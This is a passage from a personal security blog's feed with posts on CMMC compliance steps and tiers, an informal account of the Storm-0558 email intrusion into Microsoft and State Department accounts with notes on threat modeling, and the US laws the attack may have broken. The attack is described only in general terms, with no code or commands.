audience.</p> <ol> <li> <p><strong>Identify Necessary Level of CMMC Compliance</strong></p> <p>As discussed in my <a href="/blog/2024/CMMC-2.0-Summary/">previous post on CMMC</a>, CMMC is broken into 3 levels or tiers and not all organizations in the DIB will need to achieve level 3. Organizations should consider what kind of information they are likely to encounter throughout their work with the DoD. FCI requires level 1, CUI and CTI require level 2, and CUI associated with critical programs requires level 3.</p> </li> <li> <p><strong>Identify In-Scope Assets</strong></p> <p>That is, identify assets that CMMC will cover. The entire organization may not need to be CMMC compliant depending on the scale of the organization. Only areas of the organization that will handle FCI or CUI need to be compliant with CMMC, so establishing a scope is an important step. This includes identifying endpoints, networks, network hardware, facilities, people, and policies that CMMC will apply to.</p> </li> <li> <p><strong>Identify Areas That Need To Change</strong></p> <p>Decide if the organization needs large-scale technical change to achieve certification. If so, choose a technical paradigm and design for CMMC implementation. Again, depending on some of the information collected in the scoping step, the scale of an organization’s CMMC implementation can vary greatly, and depending on the organization’s needs, different technical solutions will offer different advantages.</p> <p>Specifically, cloud providers may offer low-cost and ready-made solutions for organizations with small-scale CMMC needs. In contrast, organizations with large-scale CMMC needs may want to invest in on-premise infrastructure instead. This step also includes examining current security policies, logging policies, education policies, access policies, and all other in-scope items.</p> </li> <li> <p><strong>Implement necessary changes identified in step 3</strong></p> <p>Now it’s time to implement the technical designs, policy changes, or any other identified items. This will entail choosing specific cloud service providers, services, and/or designing and implementing the on-premise IT solution that was determined in step 3. All in-scope services, endpoints, and network systems in accordance with the requirements of NIST SP 800-171. This step also includes updating or writing new policies and implementing them throughout the CMMP scope.</p> </li> <li> <p><strong>Ensure Changes are implemented Well Before Assessment</strong></p> <p>All previous steps should be completed well in advance of 3rd-party assessment. Assessors will not be happy, for example, if a new physical access control policy was implemented the day before the assessment, so organizations should make sure all in-scope changes are ingrained in company culture before assessment. Organizations should self-assess and, depending on scale of the CMMC implementation, it may be a good idea to have a 3rd-party perform a CMMC readiness assessment to serve as a “dry run” for the live CMMC assessment <a class="citation" href="#auditorsense_what_2021">(AuditorSense, 2021)</a>.</p> </li> <li> <p><strong>Maintain Changes</strong></p> <p>Make and implement plans for maintenance and upkeep of in-scope services, policies, and practices. This can involve employing an MSP or MSSP if the organization doesn’t have a dedicated IT or security department or making sure the IT department has the resources in place to manage and maintain the new infrastructure for CMMC. It also involves regular education, policy review, and self-assessment of CMMC compliance.</p> </li> <li> <p><strong>Schedule CMMC Assessment</strong></p> <p>Finally, the assessment can be scheduled and completed.If all goes well, the organization is now CMMC certified in their desired CMMC level.</p> </li> </ol> <h1 id="what-is-necessary-for-cmmc-compliance">What Is Necessary for CMMC compliance?</h1> <p>Speaking broadly, CMMC was created to ensure compliance with <a href="https://csrc.nist.gov/pubs/sp/800/171/r3/final">NIST SP 800-171</a>. As such, the domains of NIST SP 800-171 go hand-in-hand with the 7 steps listed above and should be considered at each step of the preparation and implementation process. CMMC heavily references SP 800-171 and in many cases implementing a control in 800-171 is equivalent to implementing a required control for CMMC, especially now that CMMC 2.0 is live. NIST SP 800-171 is meant to provide controls for how contractors and subcontractors handle and secure CUI <a class="citation" href="#harrington_nist_2022">(Harrington, 2022)</a>. At a high level, it is broken into 14 domains, which provide a birds’ eye view of what CMMC implementation will entail.</p> <p>The list below is referenced from NIST SP 800-171, and the descriptions are brief summaries of the controls described in each section of the document <a class="citation" href="#ross_protecting_2020">(Ross et al., 2024)</a>:</p> <ol> <li> <p><strong>Access Controls</strong></p> <p>Control who has access to data and manage their access needs.</p> </li> <li> <p><strong>Awareness and Training</strong></p> <p>Security training, ensuring employees have proper training for their positions, etc.</p> </li> <li> <p><strong>Audit and accountability</strong></p> <p>Create audit logs, ensure accountability for actions can be traced, organize and analyze audit logs and data.</p> </li> <li> <p><strong>Configuration management</strong></p> <p>Inventory and maintain baseline and security configurations for all systems, track and log changes to configurations, and consider the security implications of any configuration changes.</p> </li> <li> <p><strong>Identification and authentication</strong></p> <p>Identify and authenticate all system users, processes, and devices, use MFA, and implement other relevant controls to prevent authentication bypass.</p> </li> <li> <p><strong>Incident response</strong></p> <p>Create incident response plans, track and report incidents, and test response capability.</p> </li> <li> <p><strong>Maintenance</strong></p> <p>Provide resources and perform maintenance on all organizational systems. Perform maintenance responsibly and in accordance with other security requirements.</p> </li> <li> <p><strong>Media Protection</strong></p> <p>Ensure secure environment for physical media that contains sensitive information, identify such media and control its use, access to it, and maintain access accountability. Sanitize before disposal.</p> </li> <li> <p><strong>Personnel security</strong></p> <p>Screen and vet personnel, tightly control sensitive systems during and after terminations or other high-risk personnel transitions.</p> </li> <li> <p><strong>Physical protection</strong></p> <p>Limit physical access to systems, equipment, and facility, escort visitors, maintain access logs, and control physical access devices (i.e. keys, badges, etc.).</p> </li> <li> <p><strong>Risk assessment</strong></p> <p>Perform periodic formal risk assessments, scan systems for vulnerabilities, and remediate any that are found.</p> </li> <li> <p><strong>Security assessment</strong></p> <p>Perform period assessments of security controls, monitor and assess the effectiveness of controls, and maintain an understanding of system boundaries and scope.</p> </li> <li> <p><strong>System and communications protection</strong></p> <p>Monitor and ensure security of communication methods in and out of the organization, separate and segment networks according to functionality, and implement appropriate network security solutions.</p> </li> <li> <p><strong>System and information integrity</strong></p> <p>Identify and report system flaws, implement and update antivirus and/or IPS/IDS/EDR solutions, monitor and respond to security alerts, and unauthorized access.</p> </li> </ol>]]></content><author><name></name></author><category term="Opinion"/><category term="compliance"/><category term="security"/><category term="china"/><category term="DoD"/><category term="CMMC"/><category term="standards"/><category term="NIST"/><summary type="html"><![CDATA[Basic considerations for what needs to be done to implement CMMC at any organization.]]></summary></entry><entry><title type="html">CMMC 2.0 Is Important For The DIB, The U.S. Military, and Tax Payers Like You And Me</title><link href="https://its-radio.github.io/blog/2024/CMMC-2.0-Summary/" rel="alternate" type="text/html" title="CMMC 2.0 Is Important For The DIB, The U.S. Military, and Tax Payers Like You And Me"/><published>2024-10-10T00:00:00+00:00</published><updated>2024-10-10T00:00:00+00:00</updated><id>https://its-radio.github.io/blog/2024/CMMC-2.0-Summary</id><content type="html" xml:base="https://its-radio.github.io/blog/2024/CMMC-2.0-Summary/"><![CDATA[<h1 id="why-does-the-cmmc-exist">Why does the CMMC exist?</h1> <p>The DoD created the CMMC (Cybersecurity Maturity Model Certification) on an aggressive timeline in response to the unacceptable rate of data breaches occurring in the DIB (Defense Industrial Base). Even before the DoD rolled out CMMC, DIB companies were required to self-attest that they were compliant with NIST SP 800-171 Protecting Controlled Unclassified Information in Nonfederal Systems and Organizations. Defense contractors broadly claimed to meet these requirements. However, despite the self-attestations, CUI (Controlled Unclassified Information) was somehow finding its way into the hands of adversaries of The United States.</p> <p>But how could this happen? Could defense contractors really be lying to the US government for profit? Would they really allow hundreds of billions of US tax dollars to directly fund the development of The United States’ adversaries’ militaries just so they didn’t have to fund their own cybersecurity programs? Unfortunately, yes. They were lying to the DoD, not complying with NIST SP 800-171, and allowing foreign adversaries to steal US military secrets. The list of projects that China is known to have stolen information related to, though not complete, includes the F-35 Fighter, F-15 Fighter, B-52 Bomber, the Aegis Combat System, the Patriot Missile system, the Delta IV Rocket, and even the Space Shuttle <a class="citation" href="#blair_opinion_2017">(Blair &amp; Alexander, 2017)</a>.</p> <p>Whether the DIB’s non-compliance was due to conscious disregard or negligence, their failure to properly secure sensitive information led to the loss of intellectual property and information about military hardware at a previously unheard-of scale. The DoD performed “spot checks” on select companies in the DIB to see if the self-attestations were sound. Their findings led them to conclude that they had to step in and enforce compliance on the DIB <a class="citation" href="#columbo_how_2021">(Columbo, 2021)</a>. Enter CMMC.</p> <h1 id="key-differences-between-tiers-of-cmmc-10-and-cmmc-20">Key differences Between Tiers of CMMC 1.0 and CMMC 2.0</h1> <p>CMMC 1.0, the current iteration of the model, is split into 5 tiers of maturity ranging from tier 1, Basic, which allows certified organizations to handle FCI (federal contract information), to tier 5, Advanced, which allows certified organizations to handle CUI and information related to critical programs <a class="citation" href="#dod_about_nodate">(DoD, 2024)</a>. CMMC 2.0, which will transition to a 3-tier system rather than a 5-tier system, is in the works and will be released in the near future, beginning in December 2024. In fact, preliminary versions have been published and are currently open for public comment. Below is a summary of the CMMC 1.0 tiers and the CMMC 2.0 tiers, what they are, and how they relate to one another.</p> <h1 id="basic-tier-compliance">Basic-Tier Compliance</h1> <h3 id="cmmc-10-tier-1">CMMC 1.0 Tier 1</h3> <ul> <li>Requires adoption of 17 security practices</li> <li>Requires triennial 3rd-party assessment for certification</li> <li>Allows handling FCI</li> </ul> <h3 id="cmmc-20-tier-1">CMMC 2.0 Tier 1</h3> <ul> <li>Requires compliance with 15 security requirements</li> <li>Requires annual self-assessment and annual affirmation for certification</li> <li>Allows handling FCI</li> </ul> <h1 id="intermediate-tier-compliance">Intermediate-Tier Compliance</h1> <h3 id="cmmc-10-tier-2">CMMC 1.0 Tier 2</h3> <ul> <li>Requires adoption of 72 security practices &amp; 3 maturity processes</li> <li>Does not require certification.</li> <li>This is a transition tier.</li> </ul> <p><strong><em>CMMC 2.0 does not include an intermediate transition tier.</em></strong></p> <h1 id="good-tier-compliance">Good-Tier Compliance</h1> <h3 id="cmmc-10-tier-3">CMMC 1.0 Tier 3</h3> <ul> <li>Requires adoption of 130 security practices and 3 processes</li> <li>Requires triennial 3rd-party assessment for certification</li> <li>Allows handling CUI</li> </ul> <h3 id="cmmc-20-tier-2">CMMC 2.0 Tier 2</h3> <ul> <li>Requires compliance with 110 security requirements aligned with NIST SP 800-171</li> <li>Requires triennial 3rd-party assessment or triennial self-assessment (for certain programs) for certification</li> <li>Allows handling CUI</li> </ul> <h1 id="proactive-tier-compliance">Proactive-Tier Compliance</h1> <h3 id="cmmc-10-tier-4">CMMC 1.0 Tier 4</h3> <ul> <li>Requires adoption of 156 security practices and 4 processes</li> <li>Does not require certification.</li> <li>This is a transition tier</li> </ul> <p><strong><em>CMMC 2.0 does not include a proactive transition tier.</em></strong></p> <h1 id="advance-tier-compliance">Advance-Tier Compliance</h1> <h3 id="cmmc-10-tier-5">CMMC 1.0 Tier 5</h3> <ul> <li>Requires adoption of 172 security practices and 5 processes</li> <li>Requires triennial 3rd-party assessment for certification</li> <li>Allows handling CUI and critical programs</li> </ul> <h3 id="cmmc-20-tier-3">CMMC 2.0 Tier 3</h3> <ul> <li>Requires compliance with 110+ security requirements aligned with NIST SP 800-171 and 800-172</li> <li>Requires triennial government-led assessment and annual affirmation</li> <li>Allows handling CUI and critical programs</li> </ul> <p>The above information was sourced from the DoD <a class="citation" href="#dod_about_nodate">(DoD, 2024)</a> and shows that CMMC 2.0 will include some key differences from CMMC 1.0 including the removal of the transitional tiers. Additionally, while 2.0’s Basic tier now does not require any 3rd-party assessment, its Advanced tier certification will involve a government-led assessment rather than one conducted by a private certification organization.</p> <p>At the end of the day, the CMMC is absolutely necessary to stop defense contractors from leaking FCI and CUI. It seems to already have had some effect on the rates of data theft coming from China, down from 26 incidents in 2020 to 16 incidents in 2022 according to The Center for Strategic and International Studies <a class="citation" href="#csis_survey_2023">(CSIS, 2023)</a>, though the real cause of the decrease is difficult to pin down. As CMMC 2.0 is finalized, rolled out, and implemented across the DIB, it will be interesting to see how these numbers change.</p> <p><strong><em>If you liked this article, check out my <a href="/blog/2024/CMMC-2.0-Implementation/">next post</a> on CMMC implementation and what is required for compliance</em></strong></p>]]></content><author><name></name></author><category term="Opinion"/><category term="compliance"/><category term="security"/><category term="china"/><category term="DoD"/><category term="CMMC"/><category term="standards"/><category term="NIST"/><summary type="html"><![CDATA[A short history of CMMC and the differences between CMMC 1.0 & 2.0]]></summary></entry><entry><title type="html">How Chinese Spies Hacked U.S. State Department Emails–Threat Modeling for APTs and APTaaS</title><link href="https://its-radio.github.io/blog/2024/storm-0558-APT/" rel="alternate" type="text/html" title="How Chinese Spies Hacked U.S. State Department Emails–Threat Modeling for APTs and APTaaS"/><published>2024-07-12T00:00:00+00:00</published><updated>2024-07-12T00:00:00+00:00</updated><id>https://its-radio.github.io/blog/2024/storm-0558-APT</id><content type="html" xml:base="https://its-radio.github.io/blog/2024/storm-0558-APT/"><![CDATA[<p><strong>Notes:</strong></p> <p><em>1. I refer to a threat group as “Storm-0558” throughout this article, but since the time of writing Microsoft has begun tracking this group under the name “Antique Typhoon”</em></p> <p><em>2. I wrote <a href="/blog/2024/storm-0558-laws/">another blog post</a> about this attack and the U.S. laws that were broken by both the threat actors and by Microsoft.</em></p> <h2 id="how-chinese-spies-hacked-us-state-department-emails">How Chinese Spies Hacked U.S. State Department Emails</h2> <p>In the fall of 2023, I researched more than a few attacks carried out by APTs (Advanced Persistent Threats) for classes in my masters program. One of these cases stood out from the others. It caught my eye due to its complexity and the ingenuity, dedication, resources, and luck that it must have taken to execute successfully. The attack was discovered in the summer of 2023, first by the US State Department before being more thoroughly investigated by Microsoft. Microsoft was tipped off that Outlook email accounts belonging to US State Department employees and contractors were being accessed by unknown parties. Microsoft investigated and found that the patterns of activity displayed by the group were consistent with an APT conducting espionage from China. This group’s activities were distinct from previously known Chinese government APTs, so Microsoft classified the group as a developing APT and named it Storm-0558.</p> <p>Storm-0558’s patterns of activity fit neatly with many of those outlined in Hejase et al.’s 2020 review of APTs. Hejase et al. suggest that APTs may be able to successfully target and penetrate even well-resourced and well-defended organizations <a class="citation" href="#hejase_advanced_2020">(Hejase et al., 2020)</a>. Indeed, Storm-0558 penetrated Microsoft’s flagship email product <em>Outlook</em> as well as Microsoft’s corporate network. Furthermore, the attack was aimed at a razor thin set of targets–the US State Department and companies closely related to it. The attackers were highly skilled, remaining undetected in Microsoft’s systems for at least a month but possibly as long as a year or more. They achieved this by abusing an unknown flaw–a 0-day–but not a standard one. It required a special cryptographic key that had to be stolen from Microsoft. Not only that, but Microsoft didn’t even know they, themselves, had the key or that it could be stolen. It was not ever supposed to be stored on their servers, but was accidentally saved (because of a bug) as part of a crash-dump after the crash of a system that was used to generate MSA signing keys. The attackers had to know that they needed the key, know how to look for the key, compromise a Microsoft employee account, know the key would be in the crash-dump, find the crash-dump, exfiltrate it, find the key, and then use it as part of a 0-day exploit for the attack, all without detection. This is all to say that this attack took tremendous skill, time, and dedication to pull off and aligns with Hejase et al.’s descriptions of APT attacks <a class="citation" href="#hejase_advanced_2020">(Hejase et al., 2020)</a>.</p> <h2 id="using-threat-modeling-to-defend-against-apts">Using Threat Modeling To Defend Against APTs</h2> <p>A single section of a blog post is much too small to cover how to defend against APTs but I will touch on some important points that I came across during my research. Given the resources and manpower at their disposal, defense against APTs can be extremely challenging. There will never be a perfect defense strategy. In their article on using Game-Theory to identify defense strategies for use against APTs, Khalid et al. echo this sentiment, writing that in the future we will continue to see attackers’ behavior evolve to avoid detection and bypass security measures <a class="citation" href="#khalid_recent_2023">(Khalid et al., 2023)</a>. This may seem like an obvious statement but it is especially poignant when it comes to APTs. APTs, especially large government APTs, are often on the cutting-edge of technological progress. In some cases, like the case of Microsoft and Storm-0558, they will penetrate even very well-resourced organizations.</p> <p>To defend against attackers who use novel and advanced tactics, we must try to anticipate these novel tactics before they are used by thinking about how an advanced attacker <em>might try</em> to breach our defenses. This is where Threat Modeling can help. Tatam et al. highlight eight key aspects of a threat modeling exercise <a class="citation" href="#tatam_review_2021">(Tatam et al., 2021)</a>:</p> <p><em>1. Use correlated and actionable threat intelligence from multiple internal and external sources.</em> <em>2. Identify organizational specific threat agents, their motives and capability.</em> <em>3. Identify critical assets and controls.</em> <em>4. Find all relevant threats whose likelihood and business impact level are above the organization’s risk appetite.</em> <em>5. Include as many stakeholders as possible from all areas and levels of an organization.</em> <em>6. Identify boundaries of environments within the scope of the system.</em> <em>7. Identify Authentication and authorisation aspects.</em> <em>8. Choose a consistent approach and methodology that best fits requirements, maturity level, audience and environment.</em></p> <p>Applying these principles can help identify possible vectors of attack, likely targets for attack, and so on. In the case of Microsoft and Storm-0558, while I’m sure Microsoft applies many of these principles, Microsoft failed to model a threat like Storm-0558. They failed to identify the crash-dump as a critical asset (since it contained critical information). They failed to detect that the crash-dump contained a cryptographic key, leading to the failure to protect it. Their failure to detect and protect the key led to the eventual breach by Storm-0558. If their threat modeling had included thorough searches for MSA keys in places they shouldn’t be, it’s possible they would have been able to prevent the breach. This example illustrates two realities: That threat modeling, if applied properly, can help increase security at any organization, even very large ones. And that APTs may still find methods of exploitation that have not occurred to defenders, even when threat modeling has been done well.</p> <h2 id="inexperienced-nation-states-playing-catch-up">Inexperienced Nation-States Playing Catch-Up</h2> <p>APT status, at least at the highest tier, is generally reserved for governments or other organizations with a long history of signals intelligence like the U.S., China, India, U.K., etc. These countries have been pouring resources into cyber espionage for years and have used that time and experience to develop many advanced capabilities. While money can be a great catalyst for the development of espionage capabilities, the key components are really time and experience. Organizations like the NSA have spent decades trying, succeeding, failing, and iterating their technologies. There is simply no way for another country to buy that experience. In the past, this has acted as a barrier to entry for countries trying to enter the playing field. However, that paradigm is unquestionably shifting.</p> <p>Increasingly since the mid 2010s, nation-states have been able to buy their way to higher and higher tiers of the APT class. It all started with a U.S. company called Zorodium, founded in 2015. Zorodium acted as a broker for exploits, buying them from hackers and selling them to governments, their contractors, or other private companies. Since 2015, many other such brokers have popped up, funneling exploits from hackers around the world into the hands of the highest bidders. This phenomenon also gave rise to a similar, but distinct business model: APTaaS or APT as a Service. These companies offer a full service hacking suite to governments in exchange for a heft payout. Israel’s NSO Group is perhaps the most famous (and infamous) of these organizations.</p> <p>Companies like NSO develop advanced hacking tools and frameworks and then sell them to governments or other organizations that do not have the experience or ability to develop such tools on their own. It used to take years or decades to stand-up an organization competent enough to pose a significant threat as a nation-state, but thanks to APTaaS, the timeline is now much shorter. What this means is that there has been a recent proliferation of advanced cyber-weapons to many governments across the world, vastly expanding the breadth of the potential threat posed by APTs as a whole. The United States and China, among many others, have long been guilty of (ab)using their cyber-might for their own gain, often at the expense of others. With advanced cyber weapons in the hands of more nation states than ever before, these threats are multiplied many fold. While it used to be rare to be the target of an APT, it is becoming more and more common. The idea “it won’t happen to me,” which was outdated as soon as it was uttered, is especially egregious in the age of APTaaS. Today all organizations, and really all privacy-minded individuals, must assume that they could be the victim of a long-term, targeted, and advanced attack.</p>]]></content><author><name></name></author><category term="Opinion"/><category term="breach"/><category term="opinion"/><category term="china"/><category term="storm0558"/><category term="antiquetyphoon"/><category term="apt"/><summary type="html"><![CDATA[An informal discussion of Antique Typhoon's attack on Microsoft systems and email accounts associated with U.S Government personnel. A brief discussion of threat modelling and APTaaS.]]></summary></entry><entry><title type="html">The Legal Implications of Antique Typhoon’s Intrusion Into Microsoft &amp;amp; The U.S. State Department</title><link href="https://its-radio.github.io/blog/2024/storm-0558-laws/" rel="alternate" type="text/html" title="The Legal Implications of Antique Typhoon’s Intrusion Into Microsoft &amp;amp; The U.S. State Department"/><published>2024-06-21T00:00:00+00:00</published><updated>2024-06-21T00:00:00+00:00</updated><id>https://its-radio.github.io/blog/2024/storm-0558-laws</id><content type="html" xml:base="https://its-radio.github.io/blog/2024/storm-0558-laws/"><![CDATA[<p><strong>Disclaimer:</strong> <em>While I discuss U.S. laws in this article, I am not a lawyer and anything I write about law (or anything else for that matter) should be taken as my opinion and speculation, not as a statement of legal fact. Certainly nothing I write should be taken as legal advice.</em></p> <p><strong>Note:</strong> <em>I refer to a threat group as “Storm-0558” throughout this article, but since the time of writing Microsoft has begun tracking this group under the name “Antique Typhoon”</em></p> <h2 id="the-attack-and-initial-fallout">The attack and initial fallout</h2> <p>On July 11th, 2023, the Microsoft Security Response Center (MSRC) published a blog post announcing that they had mitigated an attack targeting Microsoft Cloud email accounts at 25 organizations across the world <a class="citation" href="#msrc_microsoft_2023a">(MSRC, 2023)</a>. Specifically, the attackers had seemed quite interested in U.S. government activity, targeting U.S. government agencies and adjacent organizations. Among the accounts hacked were those of U.S. Commerce Secretary Gina Raimondo, Assistant Secretary of State for East Asia Daniel Kritenbrink, and U.S. Envoy to China Nicholas Burns <a class="citation" href="#freed_chinese_2023">(Freed et al., 2023)</a>.</p> <p>Microsoft Threat Intelligence has said that the attacking group is based in China and assessed that its methods, OpSec, tradecraft, and objectives seem consistent with state-sponsored espionage <a class="citation" href="#mti_analysis_2023">(Intelligence, 2023)</a>. They have dubbed the group <em>Storm-0558</em> and differentiated it from previously identified Chinese state-sponsored hacking groups like APT31, APT41, APT10, and Salt Typhoon. Storm-0558 gained access to accounts by forging authentication tokens and using them via the Outlook Web Access web application <a class="citation" href="#msrc_microsoft_2023a">(MSRC, 2023)</a>. The precise details are a little murky even in Microsoft’s own posts about the attack, but the exploit used by the attackers required use of a Microsoft account (MSA) key that they had obtained by compromising a Microsoft employee’s account in a phishing campaign. The MSA key in question was never supposed to be saved by Microsoft but was accidentally included in a crash-dump log back in 2021 <a class="citation" href="#msrc_results_2023b">(MSRC, 2023)</a>. The stolen MSA key was then somehow accessed by the attackers and used to cryptographically sign Azure Active Directory authentication tokens that allowed access to enterprise email accounts. The attackers accessed select accounts for more than a month in 2023 and exfiltrated over 60,000 emails during that time. U.S. sources say that none of the emails contained classified or even sensitive information.</p> <p><strong>Update:</strong> <em>If you’d like to know more about the actual attack, I have since written another <a href="/blog/2024/storm-0558-APT/">post on the topic</a>. I’d also highly recommend reading the detailed reports from MSRC, which you can find in my references.</em></p> <p>As of June 2024, no official criminal proceedings have been brought as a result of this attack. Given the international nature of the attack and the fact that the attackers were probably working for Chinese intelligence, it is unlikely that any of the hackers will serve time or face consequences for this breach. However, these types of hurdles have not stopped the U.S. Department of Justice (DOJ) from issuing indictments against state-sponsored hackers in the past.</p> <h2 id="which-laws-were-broken-by-storm-0558">Which Laws Were Broken By Storm-0558?</h2> <p>It is obvious that it is illegal to hack into a large corporation and then leverage that access to read State Department employee’s emails, but it is less obvious exactly which laws make those actions illegal. To get an idea of which laws could be applied to the actions of threat actors in this case, I researched indictments issued for similar cases.</p> <p>In one similar case, in 2017, the DOJ released indictments for four Russian nationals associated with the FSB (the domestic wing of Russian Intelligence) for allegedly hacking Yahoo email accounts <a class="citation" href="#doj_office_2017">(DOJ, 2017)</a>. The 2017 case differs in many ways from Storm-0558’s 2023 attack, but some of the charges in the indictment seem like they could be applied to the members of Storm-0558. For example, it seems likely that the members of Storm-0558 violated <em>18 USC §1030. Fraud and related activity in connection with computers</em> which contains many specific criteria for violation, but in essence prohibits unauthorized access to any protected computers, including those containing information from any department of the United States <a class="citation" href="#18_usc_1030_1986">(18 USC §1030, 1986)</a>. They also probably violated <em>18 USC §1028. Fraud and related activity in connection with identification documents, authentication features, and information</em> <a class="citation" href="#18_usc_1028_1998">(18 USC §1028, 1998)</a>, <em>18 USC §1028A. Aggravated identity theft</em> <a class="citation" href="#18_usc_1028A_2004">(18 USC §1028A, 2004)</a>, and <em>18 USC §1029. Fraud and related activity in connection with access devices</em> <a class="citation" href="#18_usc_1029_1984">(18 USC §1029, 1984)</a>. The reasons that I believe they violated these laws are, respectively, because they forged authentication tokens to impersonate another person, they committed a felony while impersonating another person, and they created, possessed, and used “counterfeit” authentication tokens, i.e. access devices.</p> <h2 id="could-microsoft-be-under-legal-threat-too">Could Microsoft Be Under Legal Threat Too?</h2> <p>U.S. Senator Ron Wyden <a class="citation" href="#wyden_letter_2023">(Wyden, 2023)</a> wrote a letter to Jen Easterly, Director of CISA, Lina Khan, Chairwoman of the FTC, and Merrick Garland, U.S. Attorney General asking them to investigate Microsoft in relation to the email breach. He specifically asks Garland to determine if Microsoft broke federal contract laws, Khan to investigate privacy laws, and points out that by being negligent in this case Microsoft may have broken a court order from 2002 regarding a different security incident. Wyden doesn’t specify laws that he thinks Microsoft has broken, but I think some contenders are <em>The Federal Trade Commission Act</em> <a class="citation" href="#15_usc_41-58_1914">(15 USC §41-58, 1914)</a>, <em>The Children’s Online Privacy Protection Act</em> <a class="citation" href="#15_usc_6501-6505_1998">(15 USC §6501-6505, 1998)</a>, and <em>The Electronic Communications Privacy Act</em> <a class="citation" href="#18_usc_2510-2523_1986">(18 USC §2510-2523, 1986)</a>.</p> <p>To make matters worse for Microsoft, they weren’t even the ones who discovered the attack, instead they were notified by the U.S. State Department’s cybersecurity team <a class="citation" href="#goswami_microsoft_2023">(Goswami, 2023)</a>. Furthermore, Microsoft was charging a premium fee for access to the types of logs that allowed the State Department’s team to notice the attack. Customers who paid for the cloud email services, but not for the premium logging, had absolutely no way to know they were under attack. After looking through logs of one of the victim organizations that did not pay Microsoft for premium logs, Incident responder Steven Adair said in an interview “you couldn’t convince me anything in here is out of the ordinary and I would never suspect a breach and I’m looking for one” <a class="citation" href="#temple-raston_what_2023">(Temple-Raston &amp; Jarvis, 2023)</a>. All this is to say, Microsoft may be in some legal trouble after this incident. Between leaking the MSA key, not being able to detect the breach themselves, and charging a premium for access to the logs that contained evidence of the breach, they are already appearing pretty weak, at least in the court of public opinion</p>]]></content><author><name></name></author><category term="Opinion"/><category term="law"/><category term="cyberlaw"/><category term="opinion"/><category term="china"/><category term="storm0558"/><category term="antiquetyphoon"/><category term="apt"/><summary type="html"><![CDATA[An informal discussion of Antique Typhoon's attack on Microsoft systems and email accounts associated with U.S State Department employees as well as the laws that were likely broken along the way.]]></summary></entry></feed>